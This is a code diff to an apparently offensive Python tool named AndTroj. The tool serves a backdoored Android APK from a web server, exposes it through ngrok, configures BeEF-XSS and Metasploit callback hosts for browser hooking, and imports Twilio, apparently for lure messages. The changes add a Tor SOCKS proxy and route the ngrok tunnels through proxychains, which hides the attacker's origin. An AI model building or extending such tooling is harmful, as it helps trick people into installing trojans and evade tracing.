@@ -10,6 +10,7 @@ import string
 import subprocess
 import sys
 import time
+import socks
 import urllib2
 from urllib2 import urlopen
 from twilio.rest import Client
@@ -38,7 +39,7 @@ def apktinstaller():
     if res > "2.3.4":
         pass
     else:
-        os.system("apt-get install -y tor apktool aapt proxychains && service tor start && "
+        os.system("apt-get install -y tor apktool aapt proxychains python-socks && service tor start && "
                   "proxychains wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.4.jar -O /usr/local/bin/apktool.jar && "
                   "wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool && "
                   "chmod +x /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool")
@@ -52,6 +53,7 @@ def cls():
     os.system([linux, windows][os.name == 'nt'])
 
 cls()
+
 
 dir = "/usr/share/AndTroj"
 
@@ -70,6 +72,11 @@ def ins():
         pass
 
 ins()
+
+
+def Tor():
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+    socket.socket = socks.socksocket
 
 
 def print_logo():
@@ -479,10 +486,10 @@ def socialEng():
             print "\n"
             if Ngik == "1":
                 subprocess.call(
-                    'ngrok update'
+                    'proxychains ngrok update'
                     , shell=True)
                 subprocess.call(
-                    'gnome-terminal --tab -e \'ngrok http 80\''
+                    'gnome-terminal --tab -e \'proxychains ngrok http 80\''
                     , shell=True)
             elif Ngik == "2":
                 SSLURL = raw_input("\n\t[i] Example: instagram.com"
@@ -491,14 +498,14 @@ def socialEng():
                     'ngrok update'
                     , shell=True)
                 subprocess.call(
-                    'gnome-terminal --tab -e \'ngrok tls -hostname=' + SSLURL + ' 443\''
+                    'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + SSLURL + ' 443\''
                     , shell=True)
             else:
                 subprocess.call(
-                    'ngrok update'
+                    'proxychains ngrok update'
                     , shell=True)
                 subprocess.call(
-                    'gnome-terminal --tab -e \'ngrok http 80\''
+                    'gnome-terminal --tab -e \'proxychains ngrok http 80\''
                     , shell=True)
             subprocess.call(
                 'cp ' + MAM + '-b.apk /var/www/html/'
@@ -521,11 +528,11 @@ def socialEng():
                 , shell=True)
             subprocess.call(
                 'sed -i \'45s/.*/        dns_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml && '
-                                                             'sed -i \'103s/.*/        db_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml'
+                'sed -i \'103s/.*/        db_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml'
                 , shell=True)
             subprocess.call(
                 'sed -i \'18s/.*/            host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
-                                                                'sed -i \'28s/.*/            callback_host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml'
+                'sed -i \'28s/.*/            callback_host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml'
                 , shell=True)
             check = os.path.exists('/var/www/html/index.html')
             if check == (False):
@@ -645,10 +652,10 @@ def socialEng():
                                 "\t[?] Message Content: ")
             print "\n"
             subprocess.call(
-                'ngrok update'
+                'proxychains ngrok update'
                 , shell=True)
             subprocess.call(
-                'gnome-terminal --tab -e \'ngrok http 80\''
+                'gnome-terminal --tab -e \'proxychains ngrok http 80\''
                 , shell=True)
             subprocess.call(
                 'service apache2 start && cp ' + MAM + '-b.apk /var/www/html/'
